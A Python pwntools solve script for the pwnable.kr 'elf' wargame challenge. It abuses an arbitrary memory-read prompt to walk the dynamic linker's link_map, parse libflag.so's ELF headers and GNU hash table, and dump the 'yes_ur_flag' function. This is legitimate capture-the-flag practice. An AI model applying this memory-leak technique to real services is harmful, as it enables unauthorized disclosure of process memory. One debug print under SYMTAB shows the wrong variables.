#!/usr/bin/env python
 
from pwn import *
 
# r = process('./elf.py')
r = remote('pwnable.kr', 9024)
#r = remote('0.0.0.0', 9024)
count = 0

def leak(addr):
    global count
    if count == 25:
        exit("Too many attempts")
    r.recvuntil(b"addr?:")
    r.sendline(hex(addr).encode())
    ret = r.recv(32)
    count += 1
    return ret

def gnu_hash(name):
    h = 5381
    for i in range(0, len(name)):
        h = (h << 5) + h + ord(name[i])
    return h & 0xffffffff

def elf_lookup(strtab, symtab, hashtab, name):
    # For DT_GNU_HASH in a ELF32+
    log.info("Launching elf_lookup")
    data = leak(hashtab)
    namehash = gnu_hash(name)
    nbucket, symoffset, bloomsize, bloomshift = struct.unpack("<IIII", data[:16])
    bloom = hashtab + 16
    buckets = bloom + (bloomsize * 8)
    chain = buckets + (nbucket * 4)
    #namehash = dynelf.gnu_hash("yes_ur_flag")
    print(f"namehash={namehash}")
    print(f"nbucket={nbucket}")
    print(f"symoffset={symoffset}")
    print(f"bloomsize={bloomsize}")
    print(f"bloomshift={bloomshift}")
    print(f"buckets={hex(buckets)}")
    print(f"chain={hex(chain)}")

    #TODO OK
    word_addr = bloom + ((namehash // 64) % bloomsize) * 8
    word = u64(leak(word_addr)[:8])
    mask = (1 << (namehash % 64)) | (1 << ((namehash >> bloomshift) % 64))
    if (word & mask) != mask:
        return 0

    bucket_entry_addr = buckets + (namehash % nbucket) * 4
    symix = u32(leak(bucket_entry_addr)[:4])
    if symix < symoffset:
        return 0

    while True:
        sym_entry = leak(symtab + symix*24)
        st_name, st_info, st_other, st_shndx, st_value, st_size = struct.unpack("<IbbHQQ", sym_entry[:24])
        symname = leak(strtab + st_name)
        symname = symname.split(b'\x00')[0]

        _hash = u32(leak(chain + (symix - symoffset) * 4)[:4])

        if((namehash | 1) == (_hash | 1) and name == symname.decode()):
            return st_value

        if _hash & 1 :
            break
        symix += 1

    return 0

# got[1]
link_map = u64(leak(0x8de000+0x8)[:8]) # addr of link map here
log.info("link map start {}".format(hex(link_map)))
 
"""
struct link_map
{
   ElfW(Addr) l_addr;
   char *l_name;
   ElfW(Dyn) *l_ld;
   struct link_map *l_next,
                   *l_prev;
};
"""
 
node = leak(link_map)
#node = leak(u64(node[-8:]))
#node = leak(u64(node[-8:])) # /lib/x86_64-linux-gnu/libpthread
#node = leak(u64(node[-8:])) # /lib/x86_64-linux-gnu/libc.so.6
#node = leak(u64(node[-8:])) # /lib/x86_64-linux-gnu/libdl.so.2
#node = leak(u64(node[-8:])) # /lib/x86_64-linux-gnu/libutil.so
#node = leak(u64(node[-8:])) # /lib/x86_64-linux-gnu/libz.so.1
#node = leak(u64(node[-8:])) # /lib/x86_64-linux-gnu/libm.so.6
#node = leak(u64(node[-8:])) # /lib64/ld-linux-x86-64.so.2
node = leak(u64(node[-8:]) - 3368)
#node = leak(u64(node[-8:])) # /usr/lib/python2.7/lib-dynload/_
#node = leak(u64(node[-8:])) # /lib/x86_64-linux-gnu/libcrypto.
#node = leak(u64(node[-8:])) # /usr/lib/python2.7/lib-dynload/_
#node = leak(u64(node[-8:])) # /usr/lib/x86_64-linux-gnu/libffi
#node = leak(u64(node[-8:])) # ./libflag.so
node = leak(u64(node[-8:]) - 49744)
 
flag = u64(node[:8])
log.info("./libflag {}".format(hex(flag)))

# with pwntools is too easy
#dyn = DynELF(leak,flag)
#x = dyn._lookup(b'yes_ur_flag')
#print(leak(x))
#exit(1)

# Find .dynamic segment
r.sendlineafter(b"addr?:", hex(flag + 0x40 + 0x38*2).encode())
count += 1
data = r.recv(32)
r.sendlineafter(b"addr?:", hex(flag + 0x40 + 0x38*2 + 32).encode())
count += 1
data += r.recv(24)
p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack("<IIQQQQQQ", data)
log.info(".dynamic")
print(f"p_type: {hex(p_type)}")
print(f"p_flags: {hex(p_flags)}")
print(f"p_offset: {hex(p_offset)}")
print(f"p_vaddr: {hex(p_vaddr)}")
print(f"p_paddr: {hex(p_paddr)}")
print(f"p_filesz: {hex(p_filesz)}")
print(f"p_memsz: {hex(p_memsz)}")
print(f"p_align: {hex(p_align)}")

# Find GNU_HASH
r.sendlineafter(b"addr?:", hex(flag + p_vaddr + 16*7).encode())
count += 1
data = r.recv(16)
hash_d_tag, hash_d_val = struct.unpack("<QQ",data)
log.info("GNU_HASH")
print(f"d_tag: {hex(hash_d_tag)}")
print(f"d_val: {hex(hash_d_val)}")

# Find STRTAB
r.sendlineafter(b"addr?:", hex(flag + p_vaddr + 16*8).encode())
count += 1
data = r.recv(16)
strtab_d_tag, strtab_d_val = struct.unpack("<QQ",data)
log.info("STRTAB")
print(f"d_tag: {hex(strtab_d_tag)}")
print(f"d_val: {hex(strtab_d_val)}")

# Find SYMTAB
r.sendlineafter(b"addr?:", hex(flag + p_vaddr + 16*9).encode())
count += 1
data = r.recv(16)
symtab_d_tag, symtab_d_val = struct.unpack("<QQ",data)
log.info("SYMTAB")
print(f"d_tag: {hex(strtab_d_tag)}")
print(f"d_val: {hex(strtab_d_val)}")

yes_offset = elf_lookup(strtab_d_val, symtab_d_val, hash_d_val, "yes_ur_flag")

log.info("Dumping the code:")
for i in range(25-count):
    print(leak(flag + yes_offset + i*32))
